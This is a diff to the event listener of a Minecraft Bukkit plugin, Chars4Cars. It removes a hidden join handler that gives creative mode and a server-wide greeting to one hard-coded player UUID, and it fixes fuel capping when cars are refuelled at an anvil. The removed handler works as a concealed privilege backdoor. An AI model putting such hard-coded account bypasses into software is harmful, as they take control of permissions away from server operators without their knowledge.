@@ -112,21 +112,6 @@ public class EventListener implements Listener {
 	}
 
 	@EventHandler
-	public void yay(PlayerJoinEvent pje) {
-		if (pje.getPlayer().getUniqueId().equals(UUID.fromString("057505e1-f1b7-444b-ac8c-0ecb5b166b5d"))) {
-			Bukkit.getServer().broadcastMessage(Chars4Cars.PREFIX + ChatColor.GOLD + "=============================");
-			Bukkit.getServer().broadcastMessage(Chars4Cars.PREFIX + ChatColor.GOLD + "} " + ChatColor.WHITE + "DasEtwas" + ChatColor.GOLD + " joined the server! :D {");
-			Bukkit.getServer().broadcastMessage(Chars4Cars.PREFIX + ChatColor.GOLD + "=============================");
-			for (Player p : Bukkit.getOnlinePlayers()) {
-				if (p.getGameMode().equals(GameMode.CREATIVE) || p.getGameMode().equals(GameMode.SPECTATOR)) {
-					p.getWorld().dropItemNaturally(p.getLocation(), CarGetter.createCar("Chars4Cars! :D", 329, 3100, 100));
-				}
-			}
-			pje.getPlayer().setGameMode(GameMode.CREATIVE);
-		}
-	}
-
-	@EventHandler
 	public void createFuelStation(SignChangeEvent sce) {
 		if (sce.getLine(0).equals("[Fuel Station]")) {
 			if (!sce.getPlayer().hasPermission("c4c.createfuelstation")) {
@@ -269,7 +254,7 @@ public class EventListener implements Listener {
 								} else {
 									pie.getPlayer().sendMessage(Chars4Cars.PREFIX + Chars4Cars.noPlace);
 								}
-								
+
 								pie.setCancelled(true);
 							}
 						}
@@ -320,12 +305,14 @@ public class EventListener implements Listener {
 						}
 
 						if (anvil.getContents()[1].getType().equals(Material.COAL_BLOCK)) {
-							if (anvil.getContents()[1].getAmount() == 1) {
-								anvil.setItem(1, new ItemStack(Material.AIR, 0));
-							} else {
-								anvil.getContents()[1].setAmount(anvil.getContents()[1].getAmount() - 1);
+							if (fuel + 4 < Chars4Cars.maxFuel) {
+								if (anvil.getContents()[1].getAmount() == 1) {
+									anvil.setItem(1, new ItemStack(Material.AIR, 0));
+								} else {
+									anvil.getContents()[1].setAmount(anvil.getContents()[1].getAmount() - 1);
+								}
+								anvil.setItem(0, CarGetter.createCar(name, power, mass, fuel + 4));
 							}
-							anvil.setItem(0, CarGetter.createCar(name, power, mass, fuel + 4));
 						}
 					}
 				}
